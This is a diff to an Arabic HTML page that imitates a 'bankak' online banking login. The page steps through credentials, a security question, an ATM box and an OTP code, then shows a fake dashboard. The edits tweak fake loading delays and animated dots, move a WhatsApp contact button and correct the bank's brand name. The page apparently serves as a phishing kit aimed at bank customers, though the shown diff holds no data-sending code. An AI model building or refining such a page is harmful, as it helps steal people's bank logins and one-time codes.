@@ -21,8 +21,6 @@
             line-height: 1.6;
         }
 
-        /* ===== تم حذف شريط التقدم (steps-bar) بالكامل ===== */
-
         /* ===== الخطوة 1: تسجيل الدخول ===== */
         #step1 { display: block; }
         .red-banner {
@@ -157,7 +155,7 @@
         }
         .error-message-simple.active { display: block; }
 
-        /* ===== Overlay للتحميل ===== */
+        /* ===== Overlay للتحميل (مع النقاط المتحركة) ===== */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -180,6 +178,20 @@
             font-weight: 800;
             color: #c1121f;
             margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+        .loading-overlay .loading-title .dot {
+            animation: dotBounce 1.4s infinite both;
+            font-size: 32px;
+            line-height: 1;
+        }
+        .loading-overlay .loading-title .dot:nth-child(2) { animation-delay: 0.2s; }
+        .loading-overlay .loading-title .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes dotBounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
         }
         .loading-overlay .loading-spinner {
             width: 60px;
@@ -355,7 +367,7 @@
         }
         .atm-box .btn-close-atm:hover { background: #c1121f; }
 
-        /* ===== الخطوة 3: OTP ===== */
+        /* ===== الخطوة 3: OTP (تم تصحيح BANKAK) ===== */
         #step3 {
             display: none;
             padding: 40px 16px 30px;
@@ -438,6 +450,7 @@
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
+            margin-bottom: 16px;
         }
         .otp-actions button {
             flex: 1;
@@ -453,27 +466,32 @@
         }
         .btn-otp-confirm { background: #e63946; color: white; }
         .btn-otp-confirm:hover { background: #c1121f; }
-        .btn-otp-whatsapp {
+
+        /* ===== زر واتساب (تم نقله تحت) ===== */
+        .whatsapp-section {
+            margin-top: 12px;
+            text-align: center;
+        }
+        .whatsapp-section .btn-otp-whatsapp {
             background: #25D366;
             color: white;
-            display: flex;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: 0.3s;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
+            width: 100%;
         }
-        .btn-otp-whatsapp:hover { background: #1da851; }
-        .otp-whatsapp-note {
-            text-align: center;
-            font-size: 13px;
-            color: #888;
-            margin-top: 16px;
-        }
-        .otp-whatsapp-note a {
-            color: #25D366;
-            font-weight: 700;
-            text-decoration: none;
-        }
-        .otp-whatsapp-note a:hover { text-decoration: underline; }
+        .whatsapp-section .btn-otp-whatsapp:hover { background: #1da851; }
+
+        /* ===== تم حذف otp-whatsapp-note بالكامل ===== */
 
         /* ===== الخطوة 4: لوحة التحكم ===== */
         #step4 {
@@ -678,9 +696,14 @@
 </head>
 <body>
 
-    <!-- ===== Overlay للتحميل (يظهر بين الخطوات) ===== -->
+    <!-- ===== Overlay للتحميل (مع النقاط المتحركة) ===== -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-title">جاري التحميل ...</div>
+        <div class="loading-title">
+            جاري التحميل
+            <span class="dot">.</span>
+            <span class="dot">.</span>
+            <span class="dot">.</span>
+        </div>
         <div class="loading-spinner"></div>
     </div>
 
@@ -768,7 +791,7 @@
     <!-- ===== الخطوة 3: رمز التحقق (OTP) ===== -->
     <div id="step3">
         <div class="otp-header">
-            <h1><i class="fas fa-shield-alt"></i> بنك | Bankok Online</h1>
+            <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
         </div>
         <div class="otp-card">
             <div class="step-title"><i class="fas fa-key"></i> رمز التحقق</div>
@@ -779,9 +802,11 @@
             <input type="text" id="otpInput" placeholder="أدخل الرمز" maxlength="6" inputmode="numeric" />
             <div class="otp-actions">
                 <button class="btn-otp-confirm" onclick="submitOtp()">تأكيد الرمز</button>
-                <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> واتساب</button>
             </div>
-            <div class="otp-whatsapp-note">لم تستلم الرمز؟ <a href="#" onclick="whatsappContact()">تواصل معنا على واتساب</a></div>
+            <!-- تم نقل زر واتساب إلى أسفل (whatsapp-section) وتم حذف نص "لم تستلم الرمز؟" -->
+            <div class="whatsapp-section">
+                <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> تواصل عبر واتساب</button>
+            </div>
         </div>
     </div>
 
@@ -871,24 +896,20 @@
         let timerInterval = null;
         let timeSeconds = 3600; // 60 دقيقة
 
-        // ===== دالة عرض رسالة التحميل لمدة 10 ثوانٍ =====
+        // ===== دالة عرض رسالة التحميل لمدة 5 ثوانٍ (مع النقاط المتحركة) =====
         function showLoadingAndTransition(targetStepId) {
-            // إظهار الـ overlay
             const overlay = document.getElementById('loadingOverlay');
             overlay.classList.add('active');
 
-            // بعد 10 ثوانٍ، إخفاء الـ overlay والانتقال للخطوة المطلوبة
             setTimeout(function() {
                 overlay.classList.remove('active');
-                // إخفاء جميع الخطوات
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'none';
                 document.getElementById('step3').style.display = 'none';
                 document.getElementById('step4').style.display = 'none';
-                // إظهار الخطوة المطلوبة
                 document.getElementById(targetStepId).style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
-            }, 10000); // 10 ثوانٍ
+            }, 5000); // 5 ثوانٍ
         }
 
         // ===== تسجيل الدخول (الخطوة 1) =====
@@ -934,9 +955,7 @@
                 return;
             }
 
-            // الانتقال للخطوة 2 مع تحميل 10 ثوانٍ
             showLoadingAndTransition('step2');
-            // تهيئة سؤال الأمان
             currentQuestionIndex = 0;
             updateQuestion();
         });
@@ -965,13 +984,11 @@
                 alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
-            // الانتقال للخطوة 3 مع تحميل 10 ثوانٍ
             showLoadingAndTransition('step3');
             startOtpTimer();
         }
 
         function cancelSecurity() {
-            // الرجوع للخطوة 1 مباشرة بدون تحميل
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step1').style.display = 'block';
             document.getElementById('footer').style.marginTop = '30px';
@@ -1023,7 +1040,6 @@
                 alert('الرمز يجب أن يكون 4-6 أرقام');
                 return;
             }
-            // الانتقال للخطوة 4 مع تحميل 10 ثوانٍ
             showLoadingAndTransition('step4');
             if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
         }
@@ -1042,7 +1058,6 @@
         // ===== الخطوة 4: لوحة التحكم =====
         function logout() {
             if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-                // الرجوع للخطوة 1 مباشرة بدون تحميل
                 document.getElementById('step4').style.display = 'none';
                 document.getElementById('step1').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '30px';
@@ -1055,7 +1070,6 @@
         }
 
         // ===== تهيئة أولية =====
-        // تأكد من ظهور الخطوة 1 فقط عند التحميل
         document.getElementById('step1').style.display = 'block';
         document.getElementById('step2').style.display = 'none';
         document.getElementById('step3').style.display = 'none';
